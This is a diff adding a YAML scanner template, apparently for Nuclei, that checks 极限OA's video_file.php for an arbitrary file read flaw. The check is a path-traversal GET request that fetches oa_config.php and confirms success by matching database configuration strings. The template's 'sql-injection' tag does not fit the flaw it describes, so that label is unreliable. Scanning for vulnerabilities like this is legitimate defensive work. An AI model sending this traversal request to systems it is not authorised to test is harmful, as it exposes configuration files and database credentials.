@@ -1,0 +1,24 @@
+id: poc-yaml-sohuu-video-file-php-anyfile-read
+info:
+  name: 极限OA video_file.php 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "$ROOT_PATH"
+          - "$MYSQL_DB="
+      - type: word
+        part: header
+        words:
+          - "filename=\"oa_config.php\""
